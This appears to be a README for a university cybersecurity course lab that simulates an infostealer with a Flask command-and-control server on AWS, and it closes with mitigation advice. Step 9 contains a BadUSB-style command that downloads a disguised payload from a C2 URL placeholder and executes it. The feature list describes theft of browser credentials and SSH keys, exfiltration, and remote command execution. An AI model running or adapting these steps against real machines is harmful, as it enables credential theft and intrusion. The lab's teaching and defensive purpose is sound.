# 🕵️‍♂️ InfoStealer and C2 Persistence

[![Status](https://img.shields.io/badge/Status-Educational%20Project-blue.svg)](https://www.unb.br/)
[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)

This repository presents an infostealer malware project with Command & Control (C2) infrastructure, developed for educational purposes in the **CyberSecurity Fundamentals** discipline at **UnB 2025.1**.

## 🎯 Project Objective

The main objective is to develop and implement a laboratory environment for simulating a cyberattack focused on **credential and sensitive data theft via Infostealer**, and maintaining **persistence through a C2 infrastructure**. The simulation aims to understand the dynamics of such attacks and propose **comprehensive solutions** (technical, operational, and procedural) for their detection, prevention, and mitigation.

This work was developed as part of the **CyberSecurity Fundamentals Seminar at UnB 2025.1**.

## ✨ Features

The project simulates a multi-stage attack, including the following key components:

* **HID Device Infection Vector (Simulated BadUSB):**
    * Simulates a USB drive that emulates a keyboard (BadUSB) to inject initial commands into the victim machine.
    * Injects commands to download and execute the Infostealer autonomously on the target machine.
* **Infostealer (Malicious Client):**
    * Developed in **Python** for multi-platform compatibility (Linux demonstrated).
    * Collects browser credentials (**Firefox**, **Chromium**).
    * Collects sensitive files (**.bash_history**, **SSH keys**).
    * Searches for **.txt** files containing keywords in their names.
    * Collects system information.
    * Exfiltrates complete files and collected information to the C2 via **HTTP POST**.
* **Command & Control (C2 Server):**
    * Implemented in **Flask (Python)**.
    * Receives and stores exfiltrated data, organized by victim ID and category.
    * Serves the `stealer_client.py` payload for download.
    * Allows the operator to send arbitrary commands to the Infostealer client, receiving the output.
    * Maintains client persistence.

## ⚙️ Lab Setup

1. **Install Required Tools**
    - Download and install [Terraform](https://www.terraform.io/downloads.html).
    - Download and install [Ansible](https://docs.ansible.com/ansible/latest/installation_guide/intro_installation.html) (not just the core).
    - Download and install [AWS CLI](https://docs.aws.amazon.com/cli/latest/userguide/getting-started-install.html).

2. **Set Up AWS Credentials and SSH Keys**
    - Create an AWS account and generate an Access Key for CLI usage.
    - Run `aws configure` to set up your credentials.
    - Create a SSH `key_pair` for your VMs

3. **Configure Variables**
    - Edit `variables.tfvars` and set your `key_pair` and IP address.
    - You can find your IP address with:  
      ```bash
      curl https://ipinfo.io/ip
      ```

4. **Prepare Deployment Script**
    - Make the deployment script executable:  
      ```bash
      chmod +x deploy.sh
      ```

5. **Deploy Infrastructure**
    - Run the deployment script, passing the path to your private key:  
      ```bash
      ./deploy.sh path-to-private-key
      ```
    - The script runs `terraform apply -auto-approve` and `ansible-playbook -i hosts playbook.yaml`.  
      You can also run these commands manually if needed and for terraform run `terraform apply` without `-auto-approve` to be asked to perform the actions.

6. **Access the Virtual Machines**
    - SSH into the web server VM:  
      ```bash
      ssh ubuntu@<IP_VM> -i path-to-private-key
      ```

7. **Troubleshooting**
    - If you see an error like:
      ```
      fatal: [<IP>]: UNREACHABLE! => {"changed": false, "msg": "Failed to connect to the host via ssh: ssh: connect to host <IP> port 22: Connection timed out", "unreachable": true}
      ```
      This can rarely happen when running `deploy.sh`. If it does, simply run the script again.

8. **Manual Fix**
    - On the victim VM, you need to run a script to seed the sensitive data in the machine:
      ```bash
      cd /tmp && ./seed_sensitive_files.sh
      ```

9. **Simulate and Detect the InfoStealer Attack**
    - On the victim VM, run (simulation of the USB):
      ```bash
      mkdir -p ~/.config/.systemd-user/ && cd ~/.config/.systemd-user/

      wget ${C2_URL}/security_debian_x386 -O /tmp/${INFOSTEALER_FILENAME} && chmod +x /tmp/${INFOSTEALER_FILENAME} && python3 /tmp/${INFOSTEALER_FILENAME}
      ```

        ## **TODO: INSERT THE OTHER STEPS**

10. **Destroy and Clean Up the Environment**
    - To remove all provisioned resources and avoid unnecessary charges, run:
        ```bash
        terraform destroy
        ```
- **WARNING: If you do NOT destroy the infrastructure after use, AWS may CHARGE YOU for active resources if you exceed the AWS Free Tier limits!**


> **NOTE:** While this setup is designed to stay within AWS Free Tier limits, you may incur small charges (a few cents) for data transfer.

## 🛡️ Detection and Mitigation Strategies

The project emphasizes proposing comprehensive solutions for detecting, preventing, and mitigating the simulated attack.

* **Technical Controls:** Firewall, EDR/Antivirus, OS hardening, log monitoring, network traffic analysis (IDS/IPS).
* **Operational Measures:** Incident Response Plan (IRP), threat hunting, backups.
* **Procedural Measures:** User awareness regarding social engineering and secure USB usage, USB device usage policies, principle of least privilege.

## ⚠️ Disclaimer

**This project is strictly for educational purposes within the CyberSecurity Fundamentals discipline at the University of Brasília (UnB 2025.1). It must not be used in production environments, real networks, or for any malicious activity. Misuse of this code is the sole responsibility of the user.**

---
